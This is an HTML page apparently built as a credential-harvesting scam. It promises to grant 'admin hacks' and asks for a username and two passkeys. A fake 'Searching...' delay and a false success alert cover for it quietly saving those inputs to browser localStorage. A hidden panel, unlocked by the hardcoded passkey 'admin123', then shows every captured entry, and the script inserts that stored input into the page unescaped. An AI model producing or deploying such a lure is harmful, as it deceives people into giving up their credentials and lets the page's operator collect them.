<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Hacks</title>
    <style>
        #searchingMessage {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            font-size: 20px;
            border-radius: 5px;
            z-index: 9999;
        }

        #displayDataBtn {
            display: none; /* Initially hidden */
        }

        .data-entry {
            margin-bottom: 10px;
            padding: 10px;
            background-color: #f1f1f1;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>

    <h1>Press to Give <input type="text" id="username" name="username"> (selected user) Admin Hacks</h1>
    <p>
        USER INFO: <input type="text" id="Passkey1" name="Passkey">
        Passkey: <input type="text" id="Passkey2" name="Passkey">
    </p>

    <button onclick="recordData()">GIVE ADMIN HACKS</button>
    <br>
    <p>Enter secret passkey to display data:</p>
    <input type="text" id="secretPasskey" placeholder="Enter secret passkey">
    <button onclick="checkPasskey()">Unlock Display Data</button>

    <button id="displayDataBtn" onclick="displayData()">DISPLAY STORED DATA</button>

    <!-- Custom "Searching..." message -->
    <div id="searchingMessage">Searching...</div>

    <h3>Stored Data:</h3>
    <div id="storedData"></div> <!-- The data will be displayed here -->

    <script>
        // Secret passkey (this can be any passkey you want)
        const correctPasskey = "admin123"; // Replace with your own passkey

        // Function to record the user data
        function recordData() {
            const username = document.getElementById('username').value;
            const passkey1 = document.getElementById('Passkey1').value;
            const passkey2 = document.getElementById('Passkey2').value;

            // Show the "Searching..." message
            document.getElementById('searchingMessage').style.display = 'block';

            // Simulate a delay (for demonstration purposes)
            setTimeout(function() {
                document.getElementById('searchingMessage').style.display = 'none';

                // Create an object with the data
                const data = {
                    username: username,
                    passkey1: passkey1,
                    passkey2: passkey2,
                    timestamp: new Date().toLocaleString() // Add a timestamp for when the data was recorded
                };

                // Retrieve the current stored data (if any)
                let storedData = JSON.parse(localStorage.getItem('userData')) || [];

                // Add the new data to the stored data array
                storedData.push(data);

                // Save the updated data back to local storage
                localStorage.setItem('userData', JSON.stringify(storedData));

                // Show a success message
                alert('admin hacks given');
            }, 3000);  // 3 seconds delay
        }

        // Function to check if the entered passkey is correct
        function checkPasskey() {
            const enteredPasskey = document.getElementById('secretPasskey').value;

            if (enteredPasskey === correctPasskey) {
                // If passkey is correct, show the "Display Data" button
                document.getElementById('displayDataBtn').style.display = 'inline-block'; // Make the button visible
                alert("Passkey is correct! You can now view the stored data.");
            } else {
                alert("Incorrect passkey. Please try again.");
            }
        }

        // Function to display the stored data
        function displayData() {
            // Retrieve data from local storage
            const storedData = JSON.parse(localStorage.getItem('userData')) || [];

            const storedDataContainer = document.getElementById('storedData');
            storedDataContainer.innerHTML = ''; // Clear any previous data displayed

            if (storedData.length > 0) {
                // Loop through the stored data and create a list of entries
                storedData.forEach((data, index) => {
                    // Create a div for each entry
                    const dataDiv = document.createElement('div');
                    dataDiv.classList.add('data-entry');

                    // Display the data (with a timestamp)
                    dataDiv.innerHTML = `
                        <strong>Entry #${index + 1}</strong><br>
                        Username: ${data.username}<br>
                        Passkey 1: ${data.passkey1}<br>
                        Passkey 2: ${data.passkey2}<br>
                        <small>Recorded at: ${data.timestamp}</small>
                    `;

                    // Append the entry to the display container
                    storedDataContainer.appendChild(dataDiv);
                });
            } else {
                // If no data is found, show a message
                storedDataContainer.innerHTML = 'No data found in local storage.';
            }
        }
    </script>

    <p>Tool Created By Arnav.</p>
    <br>
    <p style="color:#FF0000">WARNING: Unauthorized use is strictly prohibited!</p>
    </br>

</body>
</html>
